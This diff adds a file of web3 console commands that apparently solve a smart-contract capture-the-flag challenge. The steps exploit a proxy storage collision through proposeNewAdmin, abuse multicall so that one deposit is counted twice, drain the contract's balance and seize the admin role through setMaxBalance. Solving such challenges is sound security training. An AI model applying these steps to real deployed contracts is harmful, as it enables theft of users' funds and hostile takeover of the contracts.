@@ -1,0 +1,16 @@
+functionSig = await web3.eth.abi.encodeFunctionSignature('proposeNewAdmin(address)')
+param = await web3.eth.abi.encodeParameter('address',player)
+data = append param onto functionSig without the '0x' from param
+    ex:
+        functionSig = '0xa6376746'
+        param = '0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266'
+        data = '0xa6376746000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266'
+await contract.sendTransaction({from:player,data:data})
+await contract.addToWhitelist(player)
+depositSig = await contract.methods['deposit()'].request().then(v => v.data)
+nestedCall = await contract.methods['multicall(bytes[])'].request([depositSig]).then(v => v.data)
+nestedParams = [nestedCall,nestedCall]
+mainCall = await contract.methods['multicall(bytes[])'].request(nestedParams).then(v => v.data)
+await contract.sendTransaction({from:player,value: toWei(await getBalance(instance)),data:mainCall})
+await contract.execute(player,await contract.balances(player),'0x00')
+await contract.setMaxBalance(player)
